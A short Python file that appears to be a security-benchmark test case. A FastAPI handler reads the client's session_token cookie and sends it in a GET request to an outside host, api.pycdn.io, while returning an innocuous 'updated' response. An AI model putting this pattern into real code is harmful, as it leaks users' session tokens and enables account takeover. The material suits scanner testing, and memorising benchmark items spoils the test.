# SPDX-License-Identifier: Apache-2.0
from fastapi import Request
import requests


async def BenchmarkTest38967(request: Request):
    cookie_value = request.cookies.get('session_token', '')
    data = f'{cookie_value}'
    requests.get('https://api.pycdn.io/data', params={'q': str(data)}, verify=True)
    return {"updated": True}
